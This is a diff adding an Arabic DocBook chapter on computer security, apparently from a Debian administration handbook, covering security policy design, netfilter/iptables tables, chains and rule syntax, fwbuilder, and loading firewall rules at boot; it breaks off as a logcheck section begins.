@@ -1,0 +1,1489 @@
+<?xml version='1.0' encoding='utf-8' ?>
+<!DOCTYPE chapter PUBLIC "-//OASIS//DTD DocBook XML V4.5//EN" "http://www.oasis-open.org/docbook/xml/4.5/docbookx.dtd" [
+]>
+<chapter id="security">
+  <chapterinfo>
+    <mediaobject condition="pdf">
+      <imageobject>
+        <imagedata fileref="images/chap-security.png" scalefit="1" />
+      </imageobject>
+    </mediaobject>
+    <keywordset>
+      <keyword>الجدار الناري</keyword>
+      <keyword>Netfilter</keyword>
+      <keyword>IDS/NIDS</keyword>
+    </keywordset>
+  </chapterinfo>
+  <title>الأمن</title>
+  <highlights>
+    <para>تختلف درجة أهمية النظام المعلوماتي حسب البيئة. في بعض الحالات، يكون النظام حيوياً لاستمرارية الشركة. ويجب حمايته إذن من مختلف المخاطر. تدعى عملية تقييم هذه المخاطر، وتعريف وتطبيق أساليب الحماية منها ”بالعملية الأمنية“.</para>
+  </highlights>
+  <section id="sect.defining-security-policy">
+    <title>تحديد سياسة أمنية</title>
+
+    <sidebar>
+      <title><emphasis>تحذير</emphasis> مدى هذه الفصل</title>
+
+      <para>الأمن موضوع حساس جداً ومجاله واسع، لذلك نحن لا نستطيع أن ندعي أننا سنشرحه بشكل شامل في صفحات فصل واحد. سوف نوضح بعض النقاط المهمة فقط ونشرح بعض الأدوات والطرق التي يمكن أن تفيد في مجال الأمن. لمزيد من التعمق، هناك مراجع كثيرة، وكتب كاملة متخصصة في هذا الموضوع. سيكون كتاب <citetitle>Linux Server Security</citetitle> للمؤلف Michael D. Bauer (منشورات O'Reilly) نقطة انطلاق ممتازة.</para>
+    </sidebar>
+
+    <para>تغطي كلمة ”الأمن“ نفسها مجالاً واسعاً من المفاهيم، والأدوات والإجراءات، والتي لا يمكن تطبيق أي واحدة منها في جميع الحالات. تتطلب عملية اختيار واحدة منها فكرة دقيقة عن الأهداف المرجوة من حماية النظام. تبدأ عملية تأمين النظام بإجابة بعض الأسئلة. أما الاستعجال في تطبيق مجموعة عشوائية من الأدوات قد يؤدي إلى خطر التركيز على الناحية الأمنية غير المناسبة.</para>
+
+    <para>إذن أول الأشياء التي يجب تحديدها هو الهدف. من الأساليب الجيدة التي تساعد على تحديد هذا الهدف أسلوب يبدأ بطرح الأسئلة التالية:</para>
+    <itemizedlist>
+      <listitem>
+	<para><emphasis>ما</emphasis> الذي نحاول حمايته؟ تختلف السياسة الأمنية إذا كنا نريد حماية الحاسوب أو حماية البيانات. وإذا كنا نريد حماية البيانات، علينا أن نعرف أي بيانات هي المطلوب حمايتها.</para>
+      </listitem>
+      <listitem>
+	<para>ما الذي نريد أم نحتمي <emphasis>منه</emphasis>؟ هل هو تسريب البيانات السريّة؟ أم خسارة البيانات نتيجة الحوادث؟ أم خسارة أرباح نتيجة انقطاع الخدمة؟</para>
+      </listitem>
+      <listitem>
+	<para>وأيضاً، <emphasis>مَن</emphasis> الذي نحاول أن نحتمي منه؟ تختلف الإجراءات الأمنية كثيراً ما بين الحماية من خطأ فني بسيط يرتكبه أحد مستخدمي النظام المنتظمين وبين الحماية من مجموعة مهاجمين لهم أهداف محددة.</para>
+      </listitem>
+    </itemizedlist>
+
+    <para>يستخدم المصطلح ”خطر risk“ عادة للإشارة إلى جميع هذه العوامل الثلاثة معاً: ما الذي نحميه، ما الذي يجب أن نمنع حدوثه، ومن الذي يحاول أن يجعل ذلك يحدث. يجب إجابة هذه الأسئلة للوصول إلى نموذج الخطر (risk model). واعتماداً على نموذج الخطر هذا، يمكن بناء سياسة أمنية، ويمكن تطبيق هذه السياسة بتدابير صارمة.</para>
+
+    <sidebar>
+      <title><emphasis>ملاحظة</emphasis> التساؤل الدائم</title>
+
+      <para>يحاول Bruce Schneier، وهو خبير عالمي في القضايا الأمنية (ليس أمن الحواسيب فقط)، مواجهة إحدى أهم الخرافات الأمنية برفع شعار: ”الحماية هي عملية، وليست منتج“. تتغير الممتلكات التي ترام حمايتها مع الزمن، كما تتغير التهديدات والوسائل المتاحة للمهاجمين المحتملين. حتى لو كان تصميم وتطبيق السياسة الأمنية مثالياً في البداية، يجب ألا يرتاح المرء لهذا الإنجاز. عناصر الخطر في تطور، ويجب أن تتطور الاستجابة لهذه المخاطر بما هو مناسب.</para>
+    </sidebar>
+
+    <para>يجدر أيضاً أخذ القيود الإضافية بعين الاعتبار، إذ أنها تحدُّ مجال السياسات المتاحة. كم ننوي أن نبذل في سبيل حماية النظام؟ هذا السؤال يؤثر بشكل كبير على السياسة المتبعة. غالباً ما تُعرف إجابة هذا السؤال من النواحي المالية فقط، لكن هناك عناصر أخرى يجب أخذها بعين الاعتبار أيضاً، مثل درجة الإزعاج التي سوف تُفرَض على مستخدمي النظام أو مدى تراجع مستوى الأداء.</para>
+
+    <para>بعد نمذجة الخطر، يمكن البدء بالتفكير بتصميم سياسة أمنية فعلية.</para>
+
+    <sidebar>
+      <title><emphasis>ملاحظة</emphasis> السياسات المتطرفة</title>
+
+      <para>هناك حالات يكون فيها اختيار الإجراءات اللازمة لتأمين النظام بالغ البساطة.</para>
+
+      <para>مثلاً، إذا كان النظام المطلوب حمايته عبارة عن حاسب مستعمل (second-hand)، الغرض الوحيد منه جمع بعض الأرقام في نهاية اليوم، إن اتخاذ القرار بعدم إجراء أي شيء خاص لحمايته سيكون منطقياً جداً. القيمة الفعلية للنظام منخفضة. قيمة البيانات صفرية لأننا لا نخزنها على الحاسوب. إن أي مهاجم يخترق هذا ”النظام“ سيحصل فقط على آلة حاسبة ثقيلة الوزن. كلفة حماية نظام كهذا أكبر من كلفة تعرضه للاختراق على الأغلب.</para>
+
+      <para>على نقيض هذه الحالة، قد نرغب بحماية خصوصية بيانات سرية بأسلوب شامل تماماً، يفوق جميع الاعتبارات الأخرى. في هذه الحالة، الاستجابة المناسبة ستكون التدمير التام لهذه البيانات (حذف الملفات بشكل تام، وتحطيم القرص الصلب إلى أجزاء صغيرة، ثم إذابة هذه القطع في الحمض، وهكذا). إذا كان هناك متطلب إضافي يقول أن البيانات يجب أن تحفظ للاستخدام مستقبلاً (لكن لا يشترط أن تكون متاحة فورياً)، وإذا لم تكن الكلفة أيضاً ذات اعتبار، فيمكن حماية هذه البيانات بتخزينها على صفائح من خليطة بلاتين-إيريديوم وحفظها في ملاجئ حصينة ضد القنابل تحت جبال عدة حول العالم، وكلها (طبعاً) مخابئ سرية تحميها جيوش مدججة…</para>
+
+      <para>قد تبدو هذه الأمثلة متطرفة جداً، لكنها مع ذلك حلول ملائمة لمخاطر معينة، طالما أنها ناتجة عن محاكمة فكرية تأخذ بعين الاعتبار الأهداف المطلوب تحقيقها والقيود التي يجب الالتزام بها.  إن أي سياسة أمنية ناتجة عن قرار منطقي، ليست أقل قيمة من غيرها من السياسات.</para>
+    </sidebar>
+
+    <para>في معظم الحالات، يمكن تقسيم النظام المعلوماتي إلى مجموعات فرعية مستقلة ومتماسكة. لكل نظام فرعي متطلباته وقيوده الخاصة، وبالتالي يجب تقييم المخاطر وتصميم سياسة أمنية لكل واحد منها بشكل منفصل. هناك مبدأ جيد لحفظه في ذاكرتك، هو أن حماية خندق قصير وحصين أسهل من حماية جبهة طويلة ملتفة. يجب تصميم بنية الشبكة وفق هذا المبدأ: يجب تركيز الخدمات الحساسة على عدد قليل من الأجهزة، ويجب أن يكون الوصول لهذه الأجهزة عبر أقل عدد ممكن من نقاط المرور؛ فحماية نقاط المرور هذه ستكون أسهل من حماية جميع الأجهزة الحساسة من الهجمات التي ترد من جميع أنحاء العالم الخارجي. تظهر هنا فائدة فلترة الشبكات (عبر الجدران النارية وغيرها). يمكن تطبيق هذه الفلترة باستخدام معدات خاصة، لكن لعل الحل الأبسط والأكثر مرونة استخدام جدار ناري برمجي مثل الجدار المدمج في النواة لينكس. </para>
+  </section>
+  <section id="sect.firewall-packet-filtering">
+    <title>الجدار الناري أو ترشيح الرزم</title>
+    <indexterm><primary>جدار ناري</primary></indexterm>
+    <indexterm><primary>مرشِّح رزم</primary></indexterm>
+
+    <sidebar>
+      <title><emphasis>أساسيات</emphasis> الجدار الناري</title>
+      <indexterm><primary>رزمة</primary><secondary>IP</secondary></indexterm>
+
+      <para><emphasis>الجدار الناري</emphasis> هو نوع من المعدات يتألف من عتاد خاص و (أو) برمجيات تنظم رزم الشبكة الواردة أو الصادرة (الداخلة إلى الشبكة المحلية أو الخارجة منها) ولا تسمح إلا بمرور الرزم التي تطابق شروطاً معينة محددة مسبقاً.</para>
+    </sidebar>
+
+    <para>الجدار الناري هو بوابة ترشيح شبكية وهو فعال فقط مع الرزم التي تضطر للمرور عبره. بالتالي، لا يمكن أن يفيد الجدار الناري إلا إذا كان المرور عبره هو الطريق الوحيد المتاح أمام هذه الرزم.</para>
+
+    <para>لا يوجد حل جاهز بسبب عدم وجود إعداد قياسي (وبسبب شعار ”عملية، وليست منتج“). لكن هناك، على أي حال، أدوات تبسط إعداد الجدار الناري <emphasis>netfilter</emphasis>، مع تمثيل رسومي لقواعد الترشيح. <command>fwbuilder</command> هي إحدى أفضل هذه الأدوات بلا شك.</para>
+    <indexterm><primary><emphasis>netfilter</emphasis></primary></indexterm>
+
+    <sidebar>
+      <title><emphasis>حالة خاصة</emphasis> الجدار الناري المحلي</title>
+
+      <para>يمكن أن ينحصر مدى الجدار الناري بجهاز واحد بعينه (بدلاً من حماية شبكة كاملة)، وفي تلك الحالة يتمثل دوره بترشيح أو تقييد الوصول إلى بعض الخدمات، أو ربما منع الاتصالات الصادرة الناتجة عن برمجيات خبيثة التي قد يُثبِّتها المستخدم –بدراية او عن غير قصد–.</para>
+    </sidebar>
+
+    <para>تتضمن النواة لينكس الجدار الناري <emphasis>netfilter</emphasis>. يمكن التحكم به من ساحة المستخدم عبر الأمرين <command>iptables</command> و <command>ip6tables</command>. الفرق بين هذين الأمرين هو أن الأول يعمل مع شبكات IPv4، بينما يعمل الثاني مع شبكات IPv6. بما أن كلاً من هذين البروتوكولين سيبقى لعديد من السنوات القادمة على الأغلب، فيجب استخدام الأداتين على التوازي.</para>
+    <indexterm><primary><command>iptables</command></primary></indexterm>
+    <indexterm><primary><command>ip6tables</command></primary></indexterm>
+    <section id="sect.netfilter">
+      <title>عمل Netfilter</title>
+
+      <para>يستخدم <emphasis>netfilter</emphasis> أربعة جداول مختلفة تُخزِّن قواعداً تنظم ثلاثة أنواع من العمليات على الرزم:</para>
+      <itemizedlist>
+        <listitem>
+	  <para>يختص <literal>filter</literal> بقواعد الترشيح (قبول أو رفض أو تجاهل رزمة)؛</para>
+        </listitem>
+        <listitem>
+	  <para>يختص <literal>nat</literal> بترجمة عنوان المصدر أو الوجهة وأرقام المنافذ الخاصة بالرزمة؛</para>
+        </listitem>
+        <listitem>
+	  <para>يختص <literal>mangle</literal> بالتعديلات الأخرى التي تجرى على رزم IP (بما فيها حقل ToS — <emphasis>نوع الخدمة Type of Service</emphasis> — وخياراته)؛</para>
+        </listitem>
+        <listitem>
+	  <para>يسمح <literal>raw</literal> بإجراء تعديلات يدوية أخرى على الرزم قبل وصولها لنظام تتبع الاتصال.</para>
+        </listitem>
+      </itemizedlist>
+
+      <para>يحوي كل جدول قوائم من القواعد تدعى <emphasis>السلاسل chains</emphasis>. يستخدم الجدار الناري السلاسل القياسية لمعالجة الرزم بناء على حالات معرّفة مسبقاً. يستطيع مدير النظام إنشاء سلاسل أخرى، تُستَخدم فقط إذا أشارت لها إحدى السلاسل القياسية (إما بشكل مباشر أو غير مباشر).</para>
+      <indexterm><primary>chain</primary></indexterm>
+      <indexterm><primary>قاعدة ترشيح</primary></indexterm>
+
+      <para>يحوي الجدول <literal>filter</literal> ثلاث سلاسل قياسية:</para>
+      <itemizedlist>
+        <listitem>
+	  <para><literal>INPUT</literal>: تختص بالرزم التي وجهتها هي الجدار الناري نفسه؛</para>
+        </listitem>
+        <listitem>
+	  <para><literal>OUTPUT</literal>: تختص بالرزم التي يَبثُّها الجداري الناري؛</para>
+        </listitem>
+        <listitem>
+	  <para><literal>FORWARD</literal>: تختص بالرزم التي تنتقل عبر الجدار الناري (حيث لا يكون الجدار الناري مصدرها ولا وجهتها).</para>
+        </listitem>
+      </itemizedlist>
+
+      <para>كما يحوي الجدول <literal>nat</literal> أيضاً ثلاث سلاسل قياسية:</para>
+      <itemizedlist>
+        <listitem>
+	  <para><literal>PREROUTING</literal>: لتعديل الرزم فور وصولها؛</para>
+        </listitem>
+        <listitem>
+	  <para><literal>POSTROUTING</literal>: لتعديل الرزم عندما تجهز للانطلاق في طريقها؛</para>
+        </listitem>
+        <listitem>
+	  <para><literal>OUTPUT</literal>: لتعديل الرزم التي يولدها الجدار الناري نفسه.</para>
+        </listitem>
+      </itemizedlist>
+
+      <figure id="figure.chaines-netfilter">
+        <title>طريقة استدعاء سلاسل <emphasis>netfilter</emphasis></title>
+        <mediaobject>
+          <imageobject>
+            <imagedata fileref="images/netfilter.png" scalefit="1" width="65%" />
+          </imageobject>
+        </mediaobject>
+      </figure>
+
+      <para>كل سلسلة عبارة عن لائحة من القواعد؛ وكل قاعدة عبارة عن مجموعة من الشروط، وإجراءٌ يجب تنفيذه عند تحقق هذه الشروط. عند معالجة رزمة، يفحص الجدار الناري السلسلة المناسبة، قاعدة تلو أخرى؛ وعند تحقق شروط إحدى القواعد، ”يقفز“ (jump، ومن هنا جاء <literal dir="ltr">-j</literal> في الأوامر) إلى الإجراء المحدد لمتابعة المعالجة. أكثر التصرفات شيوعاً مُقيَّسَة، وهناك إجراءات خاصة لها. يقاطع تنفيذ إحدى هذه الإجراءات معالجة السلسلة، لأن مصير الرزمة قد حسم أصلاً (إلا في حالة استثنائية مذكورة أدناه):</para>
+
+      <sidebar>
+        <title><emphasis>أساسيات</emphasis> ICMP</title>
+
+	<para>بروتوكول ICMP‏ (<emphasis>Internet Control Message Protocol</emphasis>) هو البروتوكول المستخدم لإرسال معلومات مكمّلة عن الاتصالات. يسمح هذه البروتوكول بفحص اتصال الشبكة بالأمر <command>ping</command> (الذي يرسل رزمة ICMP هي <emphasis>echo request</emphasis>، التي يفترض أن يرد عليها المستقبل برسالة ICMP هي <emphasis>echo reply</emphasis>). يشير هذا البروتوكول إلى رفض الجدار الناري لرزمة ما، أو يشير لطفحان في buffer الاستقبال، أو يقترح مساراً أفضل للرزم التالية في الاتصال، وهكذا. يُعرّف هذا البروتوكول في عدة وثائق RFC؛ لكن سرعان ما أُكمِلَت ووسِّعَت الوثيقتين الأوليتين RFC777 و RFC792. <ulink type="block" url="http://www.faqs.org/rfcs/rfc777.html" /> <ulink type="block" url="http://www.faqs.org/rfcs/rfc792.html" /></para>
+
+	<para>تذكر أن buffer الاستقبال هو منطقة صغيرة من الذاكرة تُخزِّن البيانات عند وصولها من الشبكة وأثناء معالجة النواة للبيانات. إذا امتلأت المنطقة، لا يمكن استقبال بيانات جديدة، ويشير ICMP للمشكلة، بحيث يخفف المرسل من معدل الإرسال (الذي يجب أن يتوازن نظرياً بعد بعض الوقت).</para>
+        <indexterm><primary>ICMP</primary></indexterm>
+        <indexterm><primary>Internet Control Message Protocol</primary></indexterm>
+        <indexterm><primary>receive buffer</primary></indexterm>
+        <indexterm><primary>buffer</primary><secondary>receive buffer</secondary></indexterm>
+        <indexterm><primary><command>ping</command></primary></indexterm>
+
+	<para>لاحظ أنه بالرغم من إمكانية تشغيل شبكات IPv4 دون ICMP، إلا أن ICMP6 ضروري حتماً لشبكات IPv6، لأنه يجمع وظائف عديدة كانت، في زمن IPv4، متفرقة بين ICMPv4، وIGMP‏ (<emphasis>Internet Group Membership Protocol</emphasis>) و ARP‏ (<emphasis>Address Resolution Protocol</emphasis>). يُعرَّف ICMPv6 في RFC4443. <ulink type="block" url="http://www.faqs.org/rfcs/rfc4443.html" /></para>
+      </sidebar>
+
+      <para></para>
+      <itemizedlist>
+        <listitem>
+	  <para><literal>ACCEPT</literal>: يسمح للرزمة بالذهاب في سبيلها؛</para>
+        </listitem>
+        <listitem>
+	  <para><literal>REJECT</literal>: يرفض الرزمة مع الرد برزمة ICMP تبيّن الخطأ (يمكن تحديد نوع الخطأ باستخدام الخيار <literal dir="ltr">--reject-with <replaceable>type</replaceable></literal> التابع للأمر <command>iptables</command>)؛</para>
+        </listitem>
+        <listitem>
+	  <para><literal>DROP</literal>: حذف (تجاهل) الرزمة؛</para>
+        </listitem>
+        <listitem>
+	  <para><literal>LOG</literal>: تسجيل رسالة (عبر <command>syslogd</command>) فيها وصف الرزمة، لاحظ أن هذا الإجراء لا يقاطع المعالجة، ويستمر تنفيذ السلسلة عند القاعدة التالية، لذلك تحتاج عملية تسجيل الرزم المرفوضة قاعدة LOG وقاعدة REJECT/DROP؛</para>
+        </listitem>
+        <listitem>
+	  <para><literal>ULOG</literal>: تسجيل رسالة عبر <command>ulogd</command>، الذي قد يكون أكثر تكيفاً وفعالية من <command>syslogd</command> عند معالجة أعداد كبيرة من الرسائل؛ لاحظ أن هذا الإجراء، مثله مثل LOG، يعيد المعالجة للمتابعة عند القاعدة التالية من السلسلة؛</para>
+        </listitem>
+        <listitem>
+	  <para><replaceable>chain_name</replaceable>: يقفز إلى سلسلة معينة ويقيّم قواعدها؛</para>
+        </listitem>
+        <listitem>
+	  <para><literal>RETURN</literal>: يقاطع معالجة السلسلة الحالية، ويعود إلى السلسلة التي استدعتها؛ وفي حال كانت السلسلة الحالية قياسية، فلا توجد سلسلة مستدعية، وبالتالي يتم اتخاذ الإجراء الافتراضي (المعرّف بالخيار <literal dir="ltr">-P</literal> الخاص بالأمر <command>iptables</command>) بدلاً من ذلك؛</para>
+        </listitem>
+        <listitem>
+	  <para><literal>SNAT</literal> (في جدول <literal>nat</literal>): تطبيق <emphasis>Source NAT</emphasis> (تحدد الخيارات الأخرى التعديلات الفعلية التي ستُطبَّق)؛</para>
+        </listitem>
+        <listitem>
+	  <para><literal>DNAT</literal> (في جدول <literal>nat</literal>): تطبيق <emphasis>Destination NAT</emphasis> (تحدد الخيارات الأخرى التعديلات الفعلية التي ستُطبَّق)؛</para>
+        </listitem>
+        <listitem>
+	  <para><literal>MASQUERADE</literal> (في جدول <literal>nat</literal>): تطبيق <emphasis>التنكر</emphasis> (حالة خاصة من <emphasis>Source NAT</emphasis>)؛</para>
+        </listitem>
+        <listitem>
+	  <para><literal>REDIRECT</literal> (في جدول <literal>nat</literal>): إعادة توجيه رزمة إلى منفذ معين من الجدار الناري نفسه؛ يمكن استخدام هذا لإعداد بروكسي وب شفاف يعمل دون إعداد عند العميل، بما أن العميل يظن أنه يتصل مع المتلقي بينما تمر الاتصالات في الحقيقة عبر البروكسي.</para>
+        </listitem>
+      </itemizedlist>
+
+      <para>الإجراءات الأخرى، وخصوصاً تلك التي تخص الجدول <literal>mangle</literal>، تقع خارج مدى هذا النص. هناك قائمة شاملة في<citerefentry><refentrytitle>iptables</refentrytitle> <manvolnum>8</manvolnum></citerefentry>‎ و <citerefentry><refentrytitle>ip6tables</refentrytitle> <manvolnum>8</manvolnum></citerefentry>‎.</para>
+    </section>
+    <section id="sect.iptables">
+      <title>صيغة <command>iptables</command> و <command>ip6tables</command></title>
+
+      <para>يسمح الأمران <command>iptables</command> و <command>ip6tables</command> بتعديل الجداول والسلاسل والقواعد. يشير الخيار <literal dir="ltr">-t <replaceable>table</replaceable></literal> التابع لهما إلى الجدول الذي ستجرى التعديلات عليه (<literal>filter</literal> افتراضياً).</para>
+      <indexterm><primary><command>iptables</command></primary></indexterm>
+      <indexterm><primary><command>ip6tables</command></primary></indexterm>
+      <section id="sect.iptables-command">
+        <title>الأوامر</title>
+
+	<para>ينشئ الخيار <literal dir="ltr">-N <replaceable>chain</replaceable></literal> سلسلة جديدة. ويحذف <literal dir="ltr">-X <replaceable>chain</replaceable></literal> سلسلة فارغة وغير مستخدمة. يضيف الخيار <literal dir="ltr">-A <replaceable>chain</replaceable><replaceable>rule</replaceable></literal> قاعدة إلى نهاية السلسلة المحددة. يُدخِل الخيار <literal dir="ltr">-I <replaceable>chain</replaceable> <replaceable>rule_num</replaceable> <replaceable>rule</replaceable></literal> قاعدة قبل القاعدة ذات الرقم <replaceable>rule_num</replaceable>. يحذف الخيار <literal dir="ltr">-D <replaceable>chain</replaceable><replaceable>rule_num</replaceable></literal> أو (<literal dir="ltr">-D <replaceable>chain</replaceable> <replaceable>rule</replaceable></literal>) قاعدة من السلسلة؛ تحدد الصيغة الأولى القاعدة المحذوفة برقمها، أما الصيغة الثانية فتحددها بمحتوياتها. الخيار <literal dir="ltr">-F <replaceable>chain</replaceable></literal> يُفرّغ السلسلة (يحذف جميع قواعدها)؛ وإذا لم تذكر له أي سلسلة، سيحذف جميع القواعد في الجدول. يسرد الخيار <literal dir="ltr">-L <replaceable>chain</replaceable></literal> القواعد في السلسلة. وأخيراً، يعرّف الخيار <literal dir="ltr">-P <replaceable>chain</replaceable> <replaceable>action</replaceable></literal> الإجراء الافتراضي، أو ”السياسة“، للسلسلة المعطاة؛ لاحظ أن السلاسل القياسية فقط هي التي تملك سياسات كهذه.</para>
+      </section>
+      <section id="sect.iptables-rules">
+        <title>القواعد</title>
+        <indexterm><primary>قاعدة ترشيح</primary></indexterm>
+
+	<para>تُمثَّل كل قاعدة بالشكل: <literal><replaceable>conditions</replaceable> -j <replaceable>action</replaceable> <replaceable>action_options</replaceable></literal>. إذا كان هناك شروط في القاعدة نفسها، فالمعيار عندئذ هو جمع (<emphasis>and</emphasis> منطقية) هذه الشروط، وسيكون تقييد الناتج الشرط الناتج بنفس تقييد كل واحد من الشروط المستقلة على الأقل.</para>
+
+	<para>يطابق الشرط <literal dir="ltr">-p <replaceable>protocol</replaceable></literal> حقل البروتوكول لرزمة IP. أكثر القيم شيوعاً هي <literal>tcp</literal>، و<literal>udp</literal>، و<literal>icmp</literal>، و<literal>icmp6</literal>. يمكن نفي الشرط إذا سبق بعلامة التعجب (وعندها سيطابق أي رزمة يختلف بروتوكولها عن البروتوكول المحدد). لا ينحصر استخدام آلية النفي هذه مع الخيار <literal dir="ltr">-p</literal> فقط، بل يمكن تطبيقه على جميع الشروط الأخرى أيضاً.</para>
+
+	<para>يطابق الشرط <literal dir="ltr">-s <replaceable>address</replaceable></literal> أو <literal dir="ltr">-s <replaceable>network/mask</replaceable></literal> عنوان مصدر الرزمة. في المقابل، يطابق <literal dir="ltr">-d <replaceable>address</replaceable></literal> أو <literal dir="ltr">-d <replaceable>network/mask</replaceable></literal> عنوان الوجهة.</para>
+
+	<para>ينتخب الشرط <literal dir="ltr">-i <replaceable>interface</replaceable></literal>  الرزم الواردة من الواجهة الشبكية المحددة. أما <literal dir="ltr">-o <replaceable>interface</replaceable></literal> فينتخب الرزم التي ستخرج على واجهة معينة.</para>
+
+	<para>هناك شروط أخرى أكثر تحديداً مقارنة بالشروط العامة المذكورة أعلاه. مثلاً، يمكن إكمال الخيار <literal dir="ltr">-p tcp</literal> بشروط عن منافذ TCP، باستخدام تعبير مثل <literal dir="ltr">--source-port <replaceable>port</replaceable></literal> و <literal dir="ltr">--destination-port <replaceable>port</replaceable></literal>.</para>
+
+	<para>يطابق الشرط <literal dir="ltr">--state <replaceable>state</replaceable></literal> حالة الرزمة في الاتصال (هذا يحتاج وحدة النواة <command>ipt_conntrack</command>، لتتبع الاتصال). تُبيّن الحالة <literal>NEW</literal> أن الرزمة تبدأ اتصالاً جديداً؛ وتدل <literal>ESTABLISHED</literal> على الرزم التي تنتمي لاتصال منشئ مسبقاً، وتطابق الحالة <literal>RELATED</literal> الرزم التي تبدأ اتصالاً جديداً متعلقٌ باتصال موجود من قبل (يفيد هذا في اتصالات <literal>ftp-data</literal> في الوضع ”النشط active“ لبروتوكول FTP).</para>
+
+	<para>يذكر القسم السابق الإجراءات المتاحة، لكنه لا يذكر خياراتها. فإجراء <literal>LOG</literal>، على سبيل المثال، له الخيارات التالية:</para>
+        <itemizedlist>
+          <listitem>
+	    <para>يدل <literal dir="ltr">--log-level</literal> على درجة خطورة رسائل <command>syslog</command>، وقيمته الافتراضية <literal>warning</literal>.</para>
+          </listitem>
+          <listitem>
+	    <para>يسمح <literal dir="ltr">--log-prefix</literal> بتحديد سابقة نصية للتمييز بين رسائل السجل؛</para>
+          </listitem>
+          <listitem>
+	    <para>تدل الخيارات <literal dir="ltr">--log-tcp-sequence</literal> و <literal dir="ltr">--log-tcp-options</literal> و <literal dir="ltr">--log-ip-options</literal> على بيانات إضافية لتضمينها في الرسالة: وهي، على التوالي، رقم تسلسل TCP، خيارات TCP، وخيارات IP.</para>
+          </listitem>
+        </itemizedlist>
+
+	<para>يوفر الإجراء <literal>DNAT</literal> الخيار <literal dir="ltr">--to-destination <replaceable>address</replaceable>:<replaceable>port</replaceable></literal> للدلالة على عنوان IP الجديد للوجهة و (أو) رقم المنفذ. كما يوفر <literal>SNAT</literal> خيار <literal dir="ltr">--to-source <replaceable>address</replaceable>:<replaceable>port</replaceable></literal> للدلالة على عنوان IP الجديد للمصدر والمنفذ.</para>
+
+	<para>يوفر الإجراء <literal>REDIRECT</literal> (المتاح فقط إذا كان NAT متوفراً) الخيار <literal dir="ltr">--to-ports <replaceable>port(s)</replaceable></literal> للدلالة على المنفذ، أو مجال المنافذ، الذي يجب إعادة توجيه الرزم إليه.</para>
+      </section>
+    </section>
+    <section id="sect.creating-rules">
+      <title> إنشاء قواعد</title>
+
+      <para>يحتاج إنشاء كل قاعدة إلى استدعاء واحد للأمر <command>iptables</command>/<command>ip6tables</command>. طباعة هذه الأوامر يدوياً قد تكون مملة، لذلك تُخزَّن الاستدعاءات عادة في سكربت بحيث تُضبَط نفس الإعدادات تلقائياً في كل مرة يقلع فيها الجهاز. يمكن كتابة هذا السكربت يدوياً، لكن قد ترغب باستخدام أداة عالية المستوى لتجهيزه مثل <command>fwbuilder</command>.</para>
+
+      
+      <screen>
+<computeroutput># </computeroutput><userinput>apt install fwbuilder</userinput>
+</screen>
+
+      <para>المبدأ بسيط. في الخطوة الأولى، عليك تحديد جميع العناصر التي ستدخل في القواعد ذاتها:</para>
+      <itemizedlist>
+        <listitem>
+	  <para>الجدار الناري نفسه، مع واجهاته الشبكية؛</para>
+        </listitem>
+        <listitem>
+	  <para> الشبكات، مع مجالات عناوين IP الخاصة بها؛</para>
+        </listitem>
+        <listitem>
+	  <para>المخدمات؛</para>
+        </listitem>
+        <listitem>
+	  <para>المنافذ التي تنتمي للخدمات المستضافة على المخدمات.</para>
+        </listitem>
+      </itemizedlist>
+
+      <para>بعدها تُنشَأ القواعد بإجراء عمليات سحب وإفلات بسيطة على الكائنات. هناك بضعة قوائم سياق يمكنها تغيير الشروط (نفيها مثلاً). بعدها يجب تحديد الإجراء وضبطه.</para>
+
+      <para>فيما يتعلق ببروتوكول IPv6، فيمكن إنشاء مجموعتين منفصلتين من القواعد واحدة لبروتوكول IPv4 والأخرى لبروتوكول IPv6، أو إنشاء مجموعة واحدة فقط وترك <command>fwbuilder</command> يتولى ترجمة القواعد حسب العناوين المسندة للكائنات.</para>
+
+      <figure id="figure.fwbuilder">
+        <title>نافذة fwbuilder الرئيسية</title>
+        <mediaobject>
+          <imageobject>
+            <imagedata fileref="images/fwbuilder.png" scalefit="1" />
+          </imageobject>
+        </mediaobject>
+      </figure>
+      <indexterm><primary><command>fwbuilder</command></primary></indexterm>
+
+      <para>يمكن بعدها أن يولّد <command>fwbuilder</command> سكربتاً يضبط الجدار الناري وفق القواعد المُعرّفة. تسمح بنية هذا البرنامج التجزيئية بتوليد سكربتات تستهدف نظماً مختلفة (<command>iptables</command> على لينكس، <command>ipf</command> على FreeBSD، و <command>pf</command> على OpenBSD).</para>
+
+    </section>
+    <section id="sect.install-rules-at-boot">
+      <title>تثبيت القواعد عند كل إقلاع</title>
+
+      <para>في الحالات الأخرى، الطريقة المفضلة هي تسجيل سكربت الإعداد في تعليمة <literal>up</literal> توجيهية في الملف <filename dir="ltr">/etc/network/interfaces</filename>. لقد حفظنا السكربت في المثال التالي في ملف اسمه <filename dir="ltr">/usr/local/etc/arrakis.fw</filename>.</para>
+
+      <example id="example.network-interfaces-firewall">
+        <title>ملف <filename>interfaces</filename> يستدعي سكربت إعداد الجدار الناري</title>
+
+        <programlisting>auto eth0
+iface eth0 inet static
+    address 192.168.0.1
+    network 192.168.0.0
+    netmask 255.255.255.0
+    broadcast 192.168.0.255
+    up /usr/local/etc/arrakis.fw
+</programlisting>
+      </example>
+      <para>هذا يفترض طبعاً أنك تستخدم <emphasis role="pkg">ifupdown</emphasis> لضبط الواجهات الشبكية. أما إذا كنت تستخدم أداة أخرى (مثل <emphasis>NetworkManager</emphasis> أو <emphasis>systemd-networkd</emphasis>)، فعليك مراجعة وثائقها الخاصة لمعرفة طريقة تنفيذ السكربتات بعد إقلاع الواجهة الشبكية.</para>
+
+    </section>
+  </section>
+  <section id="sect.supervision">
+    <title>الإشراف: المنع، والاكتشاف، والردع</title>
+    <indexterm><primary>المراقبة</primary></indexterm>
+
+    <para>المراقبة هي جزء متمم لأي سياسة أمنية وذلك لعدة أسباب. منها، أن هدف الحماية لا ينحصر عادة في ضمان سرية البيانات فقط، بل يتعداه إلى ضمان توافر الخدمات. لا بد إذن من التحقق أن كل شيء يعمل كما هو متوقع. واكتشاف أي سلوك شاذ أو تغيّر في جودة الخدمة (أو الخدمات) المقدمة في الوقت المناسب. قد تساعد عملية المراقبة على اكتشاف محاولات التطفل وتفعيل ردود سريعة قبل أن تسبب عواقب جسيمة. يراجع هذا القسم بعض الأدوات المستخدمة لمراقبة عدة نواحي في نظام دبيان. بالتالي، فهو يكمل <xref linkend="sect.monitoring" />.</para>
+    <section id="sect.logcheck">
+      <title>مراقبة السجلات باستخدام <command>logcheck</command></title>
+      <indexterm><primary><command>logcheck</command></primary></indexterm>
